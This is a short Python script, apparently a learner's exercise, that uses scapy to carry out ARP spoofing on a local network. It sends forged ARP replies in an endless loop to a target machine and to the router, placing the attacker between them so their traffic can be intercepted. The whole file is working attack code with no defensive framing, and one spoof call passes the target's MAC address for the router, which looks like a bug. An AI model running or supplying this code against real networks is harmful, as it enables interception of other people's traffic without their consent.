#!usr/env/bin/python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    #print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc

def spoof(target_ip , spoof_ip , target_mac):
    #target_mac = get_mac(target_ip)# This causes an error where the list goes out of range
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

    # print(packet.show())
    # print(packet.summary()) To print the content of the packet
    # Send the packet to the target machine giving it the kali's MAC Addresss as the address of thr router

target_mac = get_mac("192.168.0.103")  
sent_packets_count = 0 
while True:
    spoof("192.168.0.103", "192.168.0.1" , target_mac)
    spoof("192.168.0.1", "192.168.0.103" , target_mac)
    sent_packets_count = sent_packets_count+2
    print("[+] Packets sent : " + str(sent_packets_count))
    time.sleep(2)